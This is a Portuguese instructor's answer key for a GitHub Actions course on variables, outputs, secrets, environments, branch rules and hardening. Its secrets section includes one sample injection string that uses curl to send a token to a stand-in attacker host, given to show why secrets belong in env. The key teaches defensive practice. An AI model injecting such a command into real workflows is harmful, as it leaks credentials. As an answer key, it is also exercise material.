# Gabarito — Técnicas de Pipelines (GitHub Actions)

Abra só depois de tentar. A pipeline vermelha é parte do exercício.

---

## EX1 — Variáveis e precedência

**Resultado esperado:** `AMBIENTE = step`. Comentando o `env` do step → `job`. Comentando o do job → `workflow`.

**Regra:** o nível mais próximo do comando ganha (step > job > workflow). Igual a escopo de variável em qualquer linguagem.

**Desafio:** um step sem `env` próprio imprime `job` (herda do job, não do step vizinho — `env` de step não vaza para o próximo step).

**`vars.APP_NAME` vazio?** A variável foi criada em *Secrets* em vez de *Variables*, ou o nome está diferente. Nomes são case-sensitive.

---

## EX2 — Outputs

```yaml
      - name: Usar em outro job (via needs)
        env:
          VERSAO: ${{ needs.build.outputs.versao }}
        run: |
          [ -n "$VERSAO" ] || { echo "::error::versão vazia"; exit 1; }
          echo "Publicando a versão $VERSAO"
```

**Erros clássicos:** esquecer o `id: ver` no step (o output não tem "endereço"); esquecer o bloco `outputs:` no job; usar `echo "::set-output"` (depreciado, não funciona mais).

---

## EX3 — Secrets

- Step "Deploy em homolog" devolve `{"ok":true,...}` e o aluno aparece no placar. Sem `API_URL` em *Variables*, o step cai no modo simulado (plano B) — não é erro.
- **TODO 1:** `producao` com o token `api` → HTTP 403 "Token 'api' não pode fazer deploy em PRODUCAO". O token do repositório é deliberadamente fraco; o forte vive no environment (EX4).
- Log do step "imprimir" mostra `token = ***` — mascarado.
- Log do step "Mascaramento" mostra o token **invertido, legível**. Mascaramento cobre só o valor exato — e o instrutor prova isso fazendo um deploy no seu nome a partir do terminal dele (`api/roubo-ao-vivo.sh`), depois revogando.
- `run: echo "${{ secrets.API_TOKEN }}"` funciona, e é errado por dois motivos: (1) o valor é **interpolado dentro do script** antes de rodar — vira parte do comando, aparece em `set -x`, em mensagens de erro do shell e pode ser injetado (`"; curl atacante.com?t=$TOKEN; "`); (2) via `env` o valor vive só na variável do processo. Regra da sala: **secret entra por `env`, nunca no meio do `run`**.
- **PR de fork:** workflows disparados por `pull_request` de um fork **não recebem secrets** (o GitHub passa string vazia). Por isso o step 1 falha nesses PRs — e é o comportamento certo.

**Conclusão a fixar:** quem pode editar o arquivo do workflow **tem** o secret. Segredo se protege controlando quem altera a main — bloco 4.

---

## EX4 — Environment

```yaml
  deploy:
    runs-on: ubuntu-latest
    needs: sem-environment
    environment: producao
```

- Job `sem-environment` imprime `Tamanho: 0` — secret de environment é invisível fora dele.
- Job `deploy` fica em **Waiting** com o botão *Review deployments*. Aprove → roda → `{"ok":true,"ambiente":"producao"}` e a coluna **producao** do placar sobe.
- Se o aluno colocar o token `api` como `DEPLOY_TOKEN` → 403. Só o token do environment faz produção.
- **Repo privado no plano Free:** environments não têm reviewers nem secrets — o job roda sem parar. Tornar o repo público resolve para a aula.

---

## EX5 — Condições

```yaml
    if: github.event_name == 'workflow_dispatch' || (github.event_name == 'push' && github.ref == 'refs/heads/main')
```

Teste as três rotas: abrir PR mudando `app/app.py` (só `testes`); merge/push na main (`testes` + deploy homolog); *Run workflow* escolhendo `producao` (step de produção). Quebre um teste de propósito para ver o step `Avisar se quebrou` aparecer só na falha.

**Pegadinha:** `if: failure()` sem `always()`/`failure()` — steps normais não rodam depois de uma falha. E `paths:` só filtra `pull_request`/`push`; não existe para `workflow_dispatch`.

---

## EX6 — Matrix (bônus)

```yaml
    continue-on-error: ${{ matrix.experimental == true }}   # no nível do job, ao lado de strategy
```

Sem isso, a combinação `3.15-dev` (que pode nem existir no runner) derruba o run inteiro. Com isso, ela fica vermelha **sem** derrubar o run — é o padrão para "testar a próxima versão sem bloquear o time". `fail-fast: false` deixa as outras combinações terminarem em vez de cancelar tudo na primeira falha. `concurrency` com `cancel-in-progress`: faça dois pushes seguidos e veja o primeiro run ser cancelado.

---

## EX7 — Políticas

- `git push` direto na main → `remote: error: GH013: Repository rule violations found`.
- PR com teste quebrado → botão *Merge* cinza: "Required status check 'testes' is failing".
- **Required approvals = 0** porque você não pode aprovar o próprio PR. Em um time real: 1–2 aprovações + CODEOWNERS.
- Se o check não aparece na lista: ele precisa ter rodado ao menos uma vez na main **com esse nome de job**. Renomeou o job? A regra continua apontando para o nome antigo e **bloqueia tudo**.

---

## EX8 — Hardening (bônus)

```yaml
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
```

(SHAs coletados em 09/set/2026 via `git ls-remote`; o comentário `# v4` é para humanos — o Dependabot atualiza SHA e comentário juntos.)

**`pull_request_target` + checkout do PR:** esse evento roda no contexto da **base** (com secrets e token de escrita), mas se você faz checkout do código do PR, está executando código de um estranho com os seus secrets. Regra: com `pull_request_target`, nunca faça checkout de `github.event.pull_request.head.sha` e execute algo dele.

---

## Ordem de corte se a aula atrasar

1. EX8 → 2. EX6 → 3. EX2 (dar o gabarito e seguir). **Nunca cortar EX3, EX4, EX7** — são a ementa.
